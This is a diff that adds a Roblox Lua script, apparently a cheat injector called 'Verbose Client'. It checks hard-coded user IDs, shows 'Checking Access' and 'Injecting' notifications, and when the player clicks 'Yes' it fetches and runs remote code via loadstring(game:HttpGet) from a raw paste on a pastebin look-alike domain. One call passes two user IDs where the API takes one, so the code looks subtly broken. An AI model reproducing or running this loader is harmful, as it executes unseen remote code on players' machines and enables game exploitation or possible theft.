@@ -1,0 +1,39 @@
+local player = game:GetService("Players"):GetPlayerByUserId(2033825399, 317901955)
+function Callback(answer)
+    if answer == "Yes" then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Injecting Verbose Client...", -- Required
+	Text = "Your game might lag, please hold.", -- Required
+})
+wait(5)
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Verbose Client Loaded!", -- Required
+	Text = "Thanks for using Verbose Client!", -- Required
+})
+        print("VClient SS Enabled!")
+loadstring(game:HttpGet"https://pastebinp.com/raw/eccv9pgu")()
+    elseif answer == "No" then
+        print("Removed VClient :(")
+    end
+end
+
+local Bindable = Instance.new("BindableFunction")
+Bindable.OnInvoke = Callback
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Cheqer", -- Required
+	Text = "Checking Access...", -- Required
+})
+if player then
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Cheqer";
+    Text = "Access found! - Would you like to inject?";
+    Button1 = "Yes";
+    Button2 = "No";
+    Callback = Bindable
+})
+else
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Cheqer";
+    Text = "Access not found! - Sorry!";
+})
+end
